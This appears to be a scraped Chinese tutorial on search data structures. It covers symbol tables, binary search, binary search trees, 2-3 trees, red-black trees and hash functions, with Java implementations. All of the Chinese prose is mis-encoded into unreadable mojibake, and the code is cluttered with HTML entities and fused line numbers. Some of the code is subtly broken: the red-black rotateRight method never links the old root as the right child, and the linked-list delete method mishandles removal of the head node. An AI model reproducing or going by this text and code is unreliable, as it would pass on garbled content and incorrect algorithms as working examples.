java.util.Arrays.sort()ï¼Œå¯¹äºåŸå§‹æ•°æ®ç±»å‹ä½¿ç”¨ä¸‰å‘åˆ‡åˆ†çš„å¿«é€Ÿæ’åºï¼Œå¯¹äºå¼•ç”¨ç±»å‹ä½¿ç”¨å½’å¹¶æ’åºã€‚ å…­ã€æŸ¥æ‰¾ç¬¦å·è¡¨ï¼ˆSymbol Tableï¼‰æ˜¯ä¸€ç§å­˜å‚¨é”®å€¼å¯¹çš„æ•°æ®ç»“æ„ï¼Œå¯ä»¥æ”¯æŒå¿«é€ŸæŸ¥æ‰¾æ“ä½œã€‚ ç¬¦å·è¡¨åˆ†ä¸ºæœ‰åºå’Œæ— åºä¸¤ç§ï¼Œæœ‰åºç¬¦å·è¡¨ä¸»è¦æŒ‡æ”¯æŒ min()ã€max() ç­‰æ ¹æ®é”®çš„å¤§å°å…³ç³»æ¥å®ç°çš„æ“ä½œã€‚ æœ‰åºç¬¦å·è¡¨çš„é”®éœ€è¦å®ç° Comparable æ¥å£ã€‚ 12345678910public interface UnorderedST&lt;Key, Value&gt; &#123; int size(); Value get(Key key); void put(Key key, Value value); void delete(Key key);&#125; 12345678910111213141516public interface OrderedST&lt;Key extends Comparable&lt;Key&gt;, Value&gt; &#123; int size(); void put(Key key, Value value); Value get(Key key); Key min(); Key max(); int rank(Key key); List&lt;Key&gt; keys(Key l, Key h);&#125; é“¾è¡¨å®ç°æ— åºç¬¦å·è¡¨12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970public class ListUnorderedST&lt;Key, Value&gt; implements UnorderedST&lt;Key, Value&gt; &#123; private Node first; private class Node &#123; Key key; Value value; Node next; Node(Key key, Value value, Node next) &#123; this.key = key; this.value = value; this.next = next; &#125; &#125; @Override public int size() &#123; int cnt = 0; Node cur = first; while (cur != null) &#123; cnt++; cur = cur.next; &#125; return cnt; &#125; @Override public void put(Key key, Value value) &#123; Node cur = first; // å¦‚æœåœ¨é“¾è¡¨ä¸­æ‰¾åˆ°èŠ‚ç‚¹çš„é”®ç­‰äº key å°±æ›´æ–°è¿™ä¸ªèŠ‚ç‚¹çš„å€¼ä¸º value while (cur != null) &#123; if (cur.key.equals(key)) &#123; cur.value = value; return; &#125; cur = cur.next; &#125; // å¦åˆ™ä½¿ç”¨å¤´æ’æ³•æ’å…¥ä¸€ä¸ªæ–°èŠ‚ç‚¹ first = new Node(key, value, first); &#125; @Override public void delete(Key key) &#123; if (first == null) return; if (first.key.equals(key)) first = first.next; Node pre = first, cur = first.next; while (cur != null) &#123; if (cur.key.equals(key)) &#123; pre.next = cur.next; return; &#125; pre = pre.next; cur = cur.next; &#125; &#125; @Override public Value get(Key key) &#123; Node cur = first; while (cur != null) &#123; if (cur.key.equals(key)) return cur.value; cur = cur.next; &#125; return null; &#125;&#125; äºŒåˆ†æŸ¥æ‰¾å®ç°æœ‰åºç¬¦å·è¡¨ä½¿ç”¨ä¸€å¯¹å¹³è¡Œæ•°ç»„ï¼Œä¸€ä¸ªå­˜å‚¨é”®ä¸€ä¸ªå­˜å‚¨å€¼ã€‚ rank() æ–¹æ³•è‡³å…³é‡è¦ï¼Œå½“é”®åœ¨è¡¨ä¸­æ—¶ï¼Œå®ƒèƒ½å¤ŸçŸ¥é“è¯¥é”®çš„ä½ç½®ï¼›å½“é”®ä¸åœ¨è¡¨ä¸­æ—¶ï¼Œå®ƒä¹Ÿèƒ½çŸ¥é“åœ¨ä½•å¤„æ’å…¥æ–°é”®ã€‚ å¤æ‚åº¦ï¼šäºŒåˆ†æŸ¥æ‰¾æœ€å¤šéœ€è¦ logN+1 æ¬¡æ¯”è¾ƒï¼Œä½¿ç”¨äºŒåˆ†æŸ¥æ‰¾å®ç°çš„ç¬¦å·è¡¨çš„æŸ¥æ‰¾æ“ä½œæ‰€éœ€è¦çš„æ—¶é—´æœ€å¤šæ˜¯å¯¹æ•°çº§åˆ«çš„ã€‚ä½†æ˜¯æ’å…¥æ“ä½œéœ€è¦ç§»åŠ¨æ•°ç»„å…ƒç´ ï¼Œæ˜¯çº¿æ€§çº§åˆ«çš„ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879public class BinarySearchOrderedST&lt;Key extends Comparable&lt;Key&gt;, Value&gt; implements OrderedST&lt;Key, Value&gt; &#123; private Key[] keys; private Value[] values; private int N = 0; public BinarySearchOrderedST(int capacity) &#123; keys = (Key[]) new Comparable[capacity]; values = (Value[]) new Object[capacity]; &#125; @Override public int size() &#123; return N; &#125; @Override public int rank(Key key) &#123; int l = 0, h = N - 1; while (l &lt;= h) &#123; int m = l + (h - l) / 2; int cmp = key.compareTo(keys[m]); if (cmp == 0) return m; else if (cmp &lt; 0) h = m - 1; else l = m + 1; &#125; return l; &#125; @Override public List&lt;Key&gt; keys(Key l, Key h) &#123; int index = rank(l); List&lt;Key&gt; list = new ArrayList&lt;&gt;(); while (keys[index].compareTo(h) &lt;= 0) &#123; list.add(keys[index]); index++; &#125; return list; &#125; @Override public void put(Key key, Value value) &#123; int index = rank(key); // å¦‚æœæ‰¾åˆ°å·²ç»å­˜åœ¨çš„èŠ‚ç‚¹é”®ä½ keyï¼Œå°±æ›´æ–°è¿™ä¸ªèŠ‚ç‚¹çš„å€¼ä¸º value if (index &lt; N &amp;&amp; keys[index].compareTo(key) == 0) &#123; values[index] = value; return; &#125; // å¦åˆ™åœ¨æ•°ç»„ä¸­æ’å…¥æ–°çš„èŠ‚ç‚¹ï¼Œéœ€è¦å…ˆå°†æ’å…¥ä½ç½®ä¹‹åçš„å…ƒç´ éƒ½å‘åç§»åŠ¨ä¸€ä¸ªä½ç½® for (int j = N; j &gt; index; j--) &#123; keys[j] = keys[j - 1]; values[j] = values[j - 1]; &#125; keys[index] = key; values[index] = value; N++; &#125; @Override public Value get(Key key) &#123; int index = rank(key); if (index &lt; N &amp;&amp; keys[index].compareTo(key) == 0) return values[index]; return null; &#125; @Override public Key min() &#123; return keys[0]; &#125; @Override public Key max() &#123; return keys[N - 1]; &#125;&#125; äºŒå‰æŸ¥æ‰¾æ ‘äºŒå‰æ ‘ æ˜¯ä¸€ä¸ªç©ºé“¾æ¥ï¼Œæˆ–è€…æ˜¯ä¸€ä¸ªæœ‰å·¦å³ä¸¤ä¸ªé“¾æ¥çš„èŠ‚ç‚¹ï¼Œæ¯ä¸ªé“¾æ¥éƒ½æŒ‡å‘ä¸€é¢—å­äºŒå‰æ ‘ã€‚ äºŒå‰æŸ¥æ‰¾æ ‘ ï¼ˆBSTï¼‰æ˜¯ä¸€é¢—äºŒå‰æ ‘ï¼Œå¹¶ä¸”æ¯ä¸ªèŠ‚ç‚¹çš„å€¼éƒ½å¤§äºç­‰äºå…¶å·¦å­æ ‘ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹çš„å€¼è€Œå°äºç­‰äºå³å­æ ‘çš„æ‰€æœ‰èŠ‚ç‚¹çš„å€¼ã€‚ BST æœ‰ä¸€ä¸ªé‡è¦æ€§è´¨ï¼Œå°±æ˜¯å®ƒçš„ä¸­åºéå†ç»“æœé€’å¢æ’åºã€‚ åŸºæœ¬æ•°æ®ç»“æ„ï¼š 123456789101112131415161718192021222324252627282930313233343536public class BST&lt;Key extends Comparable&lt;Key&gt;, Value&gt; implements OrderedST&lt;Key, Value&gt; &#123; protected Node root; protected class Node &#123; Key key; Value val; Node left; Node right; // ä»¥è¯¥èŠ‚ç‚¹ä¸ºæ ¹çš„å­æ ‘èŠ‚ç‚¹æ€»æ•° int N; // çº¢é»‘æ ‘ä¸­ä½¿ç”¨ boolean color; Node(Key key, Value val, int N) &#123; this.key = key; this.val = val; this.N = N; &#125; &#125; @Override public int size() &#123; return size(root); &#125; private int size(Node x) &#123; if (x == null) return 0; return x.N; &#125; protected void recalculateSize(Node x) &#123; x.N = size(x.left) + size(x.right) + 1; &#125;&#125; ï¼ˆä¸ºäº†æ–¹ä¾¿ç»˜å›¾ï¼ŒäºŒå‰æ ‘çš„ç©ºé“¾æ¥ä¸ç”»å‡ºæ¥ã€‚ï¼‰ 1. get() å¦‚æœæ ‘æ˜¯ç©ºçš„ï¼Œåˆ™æŸ¥æ‰¾æœªå‘½ä¸­ï¼› å¦‚æœè¢«æŸ¥æ‰¾çš„é”®å’Œæ ¹èŠ‚ç‚¹çš„é”®ç›¸ç­‰ï¼ŒæŸ¥æ‰¾å‘½ä¸­ï¼› å¦åˆ™é€’å½’åœ°åœ¨å­æ ‘ä¸­æŸ¥æ‰¾ï¼šå¦‚æœè¢«æŸ¥æ‰¾çš„é”®è¾ƒå°å°±åœ¨å·¦å­æ ‘ä¸­æŸ¥æ‰¾ï¼Œè¾ƒå¤§å°±åœ¨å³å­æ ‘ä¸­æŸ¥æ‰¾ã€‚ 12345678910111213141516@Overridepublic Value get(Key key) &#123; return get(root, key);&#125;private Value get(Node x, Key key) &#123; if (x == null) return null; int cmp = key.compareTo(x.key); if (cmp == 0) return x.val; else if (cmp &lt; 0) return get(x.left, key); else return get(x.right, key);&#125; 2. put()å½“æ’å…¥çš„é”®ä¸å­˜åœ¨äºæ ‘ä¸­ï¼Œéœ€è¦åˆ›å»ºä¸€ä¸ªæ–°èŠ‚ç‚¹ï¼Œå¹¶ä¸”æ›´æ–°ä¸Šå±‚èŠ‚ç‚¹çš„é“¾æ¥ä½¿å¾—è¯¥èŠ‚ç‚¹æ­£ç¡®é“¾æ¥åˆ°æ ‘ä¸­ã€‚ 123456789101112131415161718 @Overridepublic void put(Key key, Value value) &#123; root = put(root, key, value);&#125;private Node put(Node x, Key key, Value value) &#123; if (x == null) return new Node(key, value, 1); int cmp = key.compareTo(x.key); if (cmp == 0) x.val = value; else if (cmp &lt; 0) x.left = put(x.left, key, value); else x.right = put(x.right, key, value); recalculateSize(x); return x;&#125; 3. åˆ†æäºŒå‰æŸ¥æ‰¾æ ‘çš„ç®—æ³•è¿è¡Œæ—¶é—´å–å†³äºæ ‘çš„å½¢çŠ¶ï¼Œè€Œæ ‘çš„å½¢çŠ¶åˆå–å†³äºé”®è¢«æ’å…¥çš„å…ˆåé¡ºåºã€‚æœ€å¥½çš„æƒ…å†µä¸‹æ ‘æ˜¯å®Œå…¨å¹³è¡¡çš„ï¼Œæ¯æ¡ç©ºé“¾æ¥å’Œæ ¹èŠ‚ç‚¹çš„è·ç¦»éƒ½ä¸º logNã€‚ åœ¨æœ€åçš„æƒ…å†µä¸‹ï¼Œæ ‘çš„é«˜åº¦ä¸º Nã€‚ 4. floor()floor(key)ï¼šå°äºç­‰äºé”®çš„æœ€å¤§é”® å¦‚æœé”®å°äºæ ¹èŠ‚ç‚¹çš„é”®ï¼Œé‚£ä¹ˆ floor(key) ä¸€å®šåœ¨å·¦å­æ ‘ä¸­ï¼› å¦‚æœé”®å¤§äºæ ¹èŠ‚ç‚¹çš„é”®ï¼Œéœ€è¦å…ˆåˆ¤æ–­å³å­æ ‘ä¸­æ˜¯å¦å­˜åœ¨ floor(key)ï¼Œå¦‚æœå­˜åœ¨å°±æ‰¾åˆ°ï¼Œå¦åˆ™æ ¹èŠ‚ç‚¹å°±æ˜¯ floor(key)ã€‚ 123456789101112131415161718public Key floor(Key key) &#123; Node x = floor(root, key); if (x == null) return null; return x.key;&#125;private Node floor(Node x, Key key) &#123; if (x == null) return null; int cmp = key.compareTo(x.key); if (cmp == 0) return x; if (cmp &lt; 0) return floor(x.left, key); Node t = floor(x.right, key); return t != null ? t : x;&#125; 5. rank()rank(key) è¿”å› key çš„æ’åã€‚ å¦‚æœé”®å’Œæ ¹èŠ‚ç‚¹çš„é”®ç›¸ç­‰ï¼Œè¿”å›å·¦å­æ ‘çš„èŠ‚ç‚¹æ•°ï¼› å¦‚æœå°äºï¼Œé€’å½’è®¡ç®—åœ¨å·¦å­æ ‘ä¸­çš„æ’åï¼› å¦‚æœå¤§äºï¼Œé€’å½’è®¡ç®—åœ¨å³å­æ ‘ä¸­çš„æ’åï¼Œå¹¶åŠ ä¸Šå·¦å­æ ‘çš„èŠ‚ç‚¹æ•°ï¼Œå†åŠ ä¸Š 1ï¼ˆæ ¹èŠ‚ç‚¹ï¼‰ã€‚ 12345678910111213141516@Overridepublic int rank(Key key) &#123; return rank(key, root);&#125;private int rank(Key key, Node x) &#123; if (x == null) return 0; int cmp = key.compareTo(x.key); if (cmp == 0) return size(x.left); else if (cmp &lt; 0) return rank(key, x.left); else return 1 + size(x.left) + rank(key, x.right);&#125; 6. min()123456789101112@Overridepublic Key min() &#123; return min(root).key;&#125;private Node min(Node x) &#123; if (x == null) return null; if (x.left == null) return x; return min(x.left);&#125; 7. deleteMin()ä»¤æŒ‡å‘æœ€å°èŠ‚ç‚¹çš„é“¾æ¥æŒ‡å‘æœ€å°èŠ‚ç‚¹çš„å³å­æ ‘ã€‚ 1234567891011public void deleteMin() &#123; root = deleteMin(root);&#125;public Node deleteMin(Node x) &#123; if (x.left == null) return x.right; x.left = deleteMin(x.left); recalculateSize(x); return x;&#125; 8. delete() å¦‚æœå¾…åˆ é™¤çš„èŠ‚ç‚¹åªæœ‰ä¸€ä¸ªå­æ ‘ï¼Œé‚£ä¹ˆåªéœ€è¦è®©æŒ‡å‘å¾…åˆ é™¤èŠ‚ç‚¹çš„é“¾æ¥æŒ‡å‘å”¯ä¸€çš„å­æ ‘å³å¯ï¼› å¦åˆ™ï¼Œè®©å³å­æ ‘çš„æœ€å°èŠ‚ç‚¹æ›¿æ¢è¯¥èŠ‚ç‚¹ã€‚ 123456789101112131415161718192021222324public void delete(Key key) &#123; root = delete(root, key);&#125;private Node delete(Node x, Key key) &#123; if (x == null) return null; int cmp = key.compareTo(x.key); if (cmp &lt; 0) x.left = delete(x.left, key); else if (cmp &gt; 0) x.right = delete(x.right, key); else &#123; if (x.right == null) return x.left; if (x.left == null) return x.right; Node t = x; x = min(t.right); x.right = deleteMin(t.right); x.left = t.left; &#125; recalculateSize(x); return x;&#125; 9. keys()åˆ©ç”¨äºŒå‰æŸ¥æ‰¾æ ‘ä¸­åºéå†çš„ç»“æœä¸ºé€’å¢çš„ç‰¹ç‚¹ã€‚ 12345678910111213141516171819@Overridepublic List&lt;Key&gt; keys(Key l, Key h) &#123; return keys(root, l, h);&#125;private List&lt;Key&gt; keys(Node x, Key l, Key h) &#123; List&lt;Key&gt; list = new ArrayList&lt;&gt;(); if (x == null) return list; int cmpL = l.compareTo(x.key); int cmpH = h.compareTo(x.key); if (cmpL &lt; 0) list.addAll(keys(x.left, l, h)); if (cmpL &lt;= 0 &amp;&amp; cmpH &gt;= 0) list.add(x.key); if (cmpH &gt; 0) list.addAll(keys(x.right, l, h)); return list;&#125; 10. æ€§èƒ½åˆ†æå¤æ‚åº¦ï¼šäºŒå‰æŸ¥æ‰¾æ ‘æ‰€æœ‰æ“ä½œåœ¨æœ€åçš„æƒ…å†µä¸‹æ‰€éœ€è¦çš„æ—¶é—´éƒ½å’Œæ ‘çš„é«˜åº¦æˆæ­£æ¯”ã€‚ 2-3 æŸ¥æ‰¾æ ‘ 2-3 æŸ¥æ‰¾æ ‘å¼•å…¥äº† 2- èŠ‚ç‚¹å’Œ 3- èŠ‚ç‚¹ï¼Œç›®çš„æ˜¯ä¸ºäº†è®©æ ‘å¹³è¡¡ã€‚ä¸€é¢—å®Œç¾å¹³è¡¡çš„ 2-3 æŸ¥æ‰¾æ ‘çš„æ‰€æœ‰ç©ºé“¾æ¥åˆ°æ ¹èŠ‚ç‚¹çš„è·ç¦»åº”è¯¥æ˜¯ç›¸åŒçš„ã€‚ 1. æ’å…¥æ“ä½œæ’å…¥æ“ä½œå’Œ BST çš„æ’å…¥æ“ä½œæœ‰å¾ˆå¤§åŒºåˆ«ï¼ŒBST çš„æ’å…¥æ“ä½œæ˜¯å…ˆè¿›è¡Œä¸€æ¬¡æœªå‘½ä¸­çš„æŸ¥æ‰¾ï¼Œç„¶åå†å°†èŠ‚ç‚¹æ’å…¥åˆ°å¯¹åº”çš„ç©ºé“¾æ¥ä¸Šã€‚ä½†æ˜¯ 2-3 æŸ¥æ‰¾æ ‘å¦‚æœä¹Ÿè¿™ä¹ˆåšçš„è¯ï¼Œé‚£ä¹ˆå°±ä¼šç ´åäº†å¹³è¡¡æ€§ã€‚å®ƒæ˜¯å°†æ–°èŠ‚ç‚¹æ’å…¥åˆ°å¶å­èŠ‚ç‚¹ä¸Šã€‚ æ ¹æ®å¶å­èŠ‚ç‚¹çš„ç±»å‹ä¸åŒï¼Œæœ‰ä¸åŒçš„å¤„ç†æ–¹å¼ï¼š å¦‚æœæ’å…¥åˆ° 2- èŠ‚ç‚¹ä¸Šï¼Œé‚£ä¹ˆç›´æ¥å°†æ–°èŠ‚ç‚¹å’ŒåŸæ¥çš„èŠ‚ç‚¹ç»„æˆ 3- èŠ‚ç‚¹å³å¯ã€‚ å¦‚æœæ˜¯æ’å…¥åˆ° 3- èŠ‚ç‚¹ä¸Šï¼Œå°±ä¼šäº§ç”Ÿä¸€ä¸ªä¸´æ—¶ 4- èŠ‚ç‚¹æ—¶ï¼Œéœ€è¦å°† 4- èŠ‚ç‚¹åˆ†è£‚æˆ 3 ä¸ª 2- èŠ‚ç‚¹ï¼Œå¹¶å°†ä¸­é—´çš„ 2- èŠ‚ç‚¹ç§»åˆ°ä¸Šå±‚èŠ‚ç‚¹ä¸­ã€‚å¦‚æœä¸Šç§»æ“ä½œç»§ç»­äº§ç”Ÿä¸´æ—¶ 4- èŠ‚ç‚¹åˆ™ä¸€ç›´è¿›è¡Œåˆ†è£‚ä¸Šç§»ï¼Œç›´åˆ°ä¸å­˜åœ¨ä¸´æ—¶ 4- èŠ‚ç‚¹ã€‚ 2. æ€§è´¨2-3 æŸ¥æ‰¾æ ‘æ’å…¥æ“ä½œçš„å˜æ¢éƒ½æ˜¯å±€éƒ¨çš„ï¼Œé™¤äº†ç›¸å…³çš„èŠ‚ç‚¹å’Œé“¾æ¥ä¹‹å¤–ä¸å¿…ä¿®æ”¹æˆ–è€…æ£€æŸ¥æ ‘çš„å…¶å®ƒéƒ¨åˆ†ï¼Œè€Œè¿™äº›å±€éƒ¨å˜æ¢ä¸ä¼šå½±å“æ ‘çš„å…¨å±€æœ‰åºæ€§å’Œå¹³è¡¡æ€§ã€‚ 2-3 æŸ¥æ‰¾æ ‘çš„æŸ¥æ‰¾å’Œæ’å…¥æ“ä½œå¤æ‚åº¦å’Œæ’å…¥é¡ºåºæ— å…³ï¼Œåœ¨æœ€åçš„æƒ…å†µä¸‹æŸ¥æ‰¾å’Œæ’å…¥æ“ä½œè®¿é—®çš„èŠ‚ç‚¹å¿…ç„¶ä¸è¶…è¿‡ logN ä¸ªï¼Œå«æœ‰ 10 äº¿ä¸ªèŠ‚ç‚¹çš„ 2-3 æŸ¥æ‰¾æ ‘æœ€å¤šåªéœ€è¦è®¿é—® 30 ä¸ªèŠ‚ç‚¹å°±èƒ½è¿›è¡Œä»»æ„çš„æŸ¥æ‰¾å’Œæ’å…¥æ“ä½œã€‚ çº¢é»‘æ ‘2-3 æŸ¥æ‰¾æ ‘éœ€è¦ç”¨åˆ° 2- èŠ‚ç‚¹å’Œ 3- èŠ‚ç‚¹ï¼Œçº¢é»‘æ ‘ä½¿ç”¨çº¢é“¾æ¥æ¥å®ç° 3- èŠ‚ç‚¹ã€‚æŒ‡å‘ä¸€ä¸ªèŠ‚ç‚¹çš„é“¾æ¥é¢œè‰²å¦‚æœä¸ºçº¢è‰²ï¼Œé‚£ä¹ˆè¿™ä¸ªèŠ‚ç‚¹å’Œä¸Šå±‚èŠ‚ç‚¹è¡¨ç¤ºçš„æ˜¯ä¸€ä¸ª 3- èŠ‚ç‚¹ï¼Œè€Œé»‘è‰²åˆ™æ˜¯æ™®é€šé“¾æ¥ã€‚ çº¢é»‘æ ‘å…·æœ‰ä»¥ä¸‹æ€§è´¨ï¼š çº¢é“¾æ¥éƒ½ä¸ºå·¦é“¾æ¥ï¼› å®Œç¾é»‘è‰²å¹³è¡¡ï¼Œå³ä»»æ„ç©ºé“¾æ¥åˆ°æ ¹èŠ‚ç‚¹çš„è·¯å¾„ä¸Šçš„é»‘é“¾æ¥æ•°é‡ç›¸åŒã€‚ ç”»çº¢é»‘æ ‘æ—¶å¯ä»¥å°†çº¢é“¾æ¥ç”»å¹³ã€‚ 12345678910public class RedBlackBST&lt;Key extends Comparable&lt;Key&gt;, Value&gt; extends BST&lt;Key, Value&gt; &#123; private static final boolean RED = true; private static final boolean BLACK = false; private boolean isRed(Node x) &#123; if (x == null) return false; return x.color == RED; &#125;&#125; 1. å·¦æ—‹è½¬å› ä¸ºåˆæ³•çš„çº¢é“¾æ¥éƒ½ä¸ºå·¦é“¾æ¥ï¼Œå¦‚æœå‡ºç°å³é“¾æ¥ä¸ºçº¢é“¾æ¥ï¼Œé‚£ä¹ˆå°±éœ€è¦è¿›è¡Œå·¦æ—‹è½¬æ“ä½œã€‚ 12345678910public Node rotateLeft(Node h) &#123; Node x = h.right; h.right = x.left; x.left = h; x.color = h.color; h.color = RED; x.N = h.N; recalculateSize(h); return x;&#125; 2. å³æ—‹è½¬è¿›è¡Œå³æ—‹è½¬æ˜¯ä¸ºäº†è½¬æ¢ä¸¤ä¸ªè¿ç»­çš„å·¦çº¢é“¾æ¥ï¼Œè¿™ä¼šåœ¨ä¹‹åçš„æ’å…¥è¿‡ç¨‹ä¸­æ¢è®¨ã€‚ 123456789public Node rotateRight(Node h) &#123; Node x = h.left; h.left = x.right; x.color = h.color; h.color = RED; x.N = h.N; recalculateSize(h); return x;&#125; 3. é¢œè‰²è½¬æ¢ä¸€ä¸ª 4- èŠ‚ç‚¹åœ¨çº¢é»‘æ ‘ä¸­è¡¨ç°ä¸ºä¸€ä¸ªèŠ‚ç‚¹çš„å·¦å³å­èŠ‚ç‚¹éƒ½æ˜¯çº¢è‰²çš„ã€‚åˆ†è£‚ 4- èŠ‚ç‚¹é™¤äº†éœ€è¦å°†å­èŠ‚ç‚¹çš„é¢œè‰²ç”±çº¢å˜é»‘ä¹‹å¤–ï¼ŒåŒæ—¶éœ€è¦å°†çˆ¶èŠ‚ç‚¹çš„é¢œè‰²ç”±é»‘å˜çº¢ï¼Œä» 2-3 æ ‘çš„è§’åº¦çœ‹å°±æ˜¯å°†ä¸­é—´èŠ‚ç‚¹ç§»åˆ°ä¸Šå±‚èŠ‚ç‚¹ã€‚ 12345void flipColors(Node h) &#123; h.color = RED; h.left.color = BLACK; h.right.color = BLACK;&#125; 4. æ’å…¥å…ˆå°†ä¸€ä¸ªèŠ‚ç‚¹æŒ‰äºŒå‰æŸ¥æ‰¾æ ‘çš„æ–¹æ³•æ’å…¥åˆ°æ­£ç¡®ä½ç½®ï¼Œç„¶åå†è¿›è¡Œå¦‚ä¸‹é¢œè‰²æ“ä½œï¼š å¦‚æœå³å­èŠ‚ç‚¹æ˜¯çº¢è‰²çš„è€Œå·¦å­èŠ‚ç‚¹æ˜¯é»‘è‰²çš„ï¼Œè¿›è¡Œå·¦æ—‹è½¬ï¼› å¦‚æœå·¦å­èŠ‚ç‚¹æ˜¯çº¢è‰²çš„ï¼Œè€Œä¸”å·¦å­èŠ‚ç‚¹çš„å·¦å­èŠ‚ç‚¹ä¹Ÿæ˜¯çº¢è‰²çš„ï¼Œè¿›è¡Œå³æ—‹è½¬ï¼› å¦‚æœå·¦å³å­èŠ‚ç‚¹å‡ä¸ºçº¢è‰²çš„ï¼Œè¿›è¡Œé¢œè‰²è½¬æ¢ã€‚ 123456789101112131415161718192021222324252627282930@Overridepublic void put(Key key, Value value) &#123; root = put(root, key, value); root.color = BLACK;&#125;private Node put(Node x, Key key, Value value) &#123; if (x == null) &#123; Node node = new Node(key, value, 1); node.color = RED; return node; &#125; int cmp = key.compareTo(x.key); if (cmp == 0) x.val = value; else if (cmp &lt; 0) x.left = put(x.left, key, value); else x.right = put(x.right, key, value); if (isRed(x.right) &amp;&amp; !isRed(x.left)) x = rotateLeft(x); if (isRed(x.left) &amp;&amp; isRed(x.left.left)) x = rotateRight(x); if (isRed(x.left) &amp;&amp; isRed(x.right)) flipColors(x); recalculateSize(x); return x;&#125; å¯ä»¥çœ‹åˆ°è¯¥æ’å…¥æ“ä½œå’ŒäºŒå‰æŸ¥æ‰¾æ ‘çš„æ’å…¥æ“ä½œç±»ä¼¼ï¼Œåªæ˜¯åœ¨æœ€ååŠ å…¥äº†æ—‹è½¬å’Œé¢œè‰²å˜æ¢æ“ä½œå³å¯ã€‚ æ ¹èŠ‚ç‚¹ä¸€å®šä¸ºé»‘è‰²ï¼Œå› ä¸ºæ ¹èŠ‚ç‚¹æ²¡æœ‰ä¸Šå±‚èŠ‚ç‚¹ï¼Œä¹Ÿå°±æ²¡æœ‰ä¸Šå±‚èŠ‚ç‚¹çš„å·¦é“¾æ¥æŒ‡å‘æ ¹èŠ‚ç‚¹ã€‚flipColors() æœ‰å¯èƒ½ä¼šä½¿å¾—æ ¹èŠ‚ç‚¹çš„é¢œè‰²å˜ä¸ºçº¢è‰²ï¼Œæ¯å½“æ ¹èŠ‚ç‚¹ç”±çº¢è‰²å˜æˆé»‘è‰²æ—¶æ ‘çš„é»‘é“¾æ¥é«˜åº¦åŠ  1. 5. åˆ†æä¸€é¢—å¤§å°ä¸º N çš„çº¢é»‘æ ‘çš„é«˜åº¦ä¸ä¼šè¶…è¿‡ 2logNã€‚æœ€åçš„æƒ…å†µä¸‹æ˜¯å®ƒæ‰€å¯¹åº”çš„ 2-3 æ ‘ï¼Œæ„æˆæœ€å·¦è¾¹çš„è·¯å¾„èŠ‚ç‚¹å…¨éƒ¨éƒ½æ˜¯ 3- èŠ‚ç‚¹è€Œå…¶ä½™éƒ½æ˜¯ 2- èŠ‚ç‚¹ã€‚ çº¢é»‘æ ‘å¤§å¤šæ•°çš„æ“ä½œæ‰€éœ€è¦çš„æ—¶é—´éƒ½æ˜¯å¯¹æ•°çº§åˆ«çš„ã€‚ æ•£åˆ—è¡¨æ•£åˆ—è¡¨ç±»ä¼¼äºæ•°ç»„ï¼Œå¯ä»¥æŠŠæ•£åˆ—è¡¨çš„æ•£åˆ—å€¼çœ‹æˆæ•°ç»„çš„ç´¢å¼•å€¼ã€‚è®¿é—®æ•£åˆ—è¡¨å’Œè®¿é—®æ•°ç»„å…ƒç´ ä¸€æ ·å¿«é€Ÿï¼Œå®ƒå¯ä»¥åœ¨å¸¸æ•°æ—¶é—´å†…å®ç°æŸ¥æ‰¾å’Œæ’å…¥æ“ä½œã€‚ ç”±äºæ— æ³•é€šè¿‡æ•£åˆ—å€¼çŸ¥é“é”®çš„å¤§å°å…³ç³»ï¼Œå› æ­¤æ•£åˆ—è¡¨æ— æ³•å®ç°æœ‰åºæ€§æ“ä½œã€‚ 1. æ•£åˆ—å‡½æ•°å¯¹äºä¸€ä¸ªå¤§å°ä¸º M çš„æ•£åˆ—è¡¨ï¼Œæ•£åˆ—å‡½æ•°èƒ½å¤ŸæŠŠä»»æ„é”®è½¬æ¢ä¸º [0, M-1] å†…çš„æ­£æ•´æ•°ï¼Œè¯¥æ­£æ•´æ•°å³ä¸º hash å€¼ã€‚ æ•£åˆ—è¡¨å­˜åœ¨å†²çªï¼Œä¹Ÿå°±æ˜¯ä¸¤ä¸ªä¸åŒçš„é”®å¯èƒ½æœ‰ç›¸åŒçš„ hash å€¼ã€‚ æ•£åˆ—å‡½æ•°åº”è¯¥æ»¡è¶³ä»¥ä¸‹ä¸‰ä¸ªæ¡ä»¶ï¼š ä¸€è‡´æ€§ï¼šç›¸ç­‰çš„é”®åº”å½“æœ‰ç›¸ç­‰çš„ hash å€¼ï¼Œä¸¤ä¸ªé”®ç›¸ç­‰è¡¨ç¤ºè°ƒç”¨ equals() è¿”å›çš„å€¼ç›¸ç­‰ã€‚ é«˜æ•ˆæ€§ï¼šè®¡ç®—åº”å½“ç®€ä¾¿ï¼Œæœ‰å¿…è¦çš„è¯å¯ä»¥æŠŠ hash å€¼ç¼“å­˜èµ·æ¥ï¼Œåœ¨è°ƒç”¨ hash å‡½æ•°æ—¶ç›´æ¥è¿”å›ã€‚ å‡åŒ€æ€§ï¼šæ‰€æœ‰é”®çš„ hash å€¼åº”å½“å‡åŒ€åœ°åˆ†å¸ƒåˆ° [0, M-1] ä¹‹é—´ï¼Œè¿™ä¸ªæ¡ä»¶è‡³å…³é‡è¦ï¼Œç›´æ¥å½±å“åˆ°æ•£åˆ—è¡¨çš„æ€§èƒ½ã€‚ é™¤ç•™ä½™æ•°æ³•å¯ä»¥å°†æ•´æ•°æ•£åˆ—åˆ° [0, M-1] ä¹‹é—´ï¼Œä¾‹å¦‚ä¸€ä¸ªæ­£æ•´æ•° kï¼Œè®¡ç®— k%M æ—¢å¯å¾—åˆ°ä¸€ä¸ª [0, M-1] ä¹‹é—´çš„ hash å€¼ã€‚æ³¨æ„ M å¿…é¡»æ˜¯ä¸€ä¸ªç´ æ•°ï¼Œå¦åˆ™æ— æ³•åˆ©ç”¨é”®åŒ…å«çš„æ‰€æœ‰ä¿¡æ¯ã€‚ä¾‹å¦‚ M ä¸º 10kï¼Œé‚£ä¹ˆåªèƒ½åˆ©ç”¨é”®çš„å k ä½ã€‚ 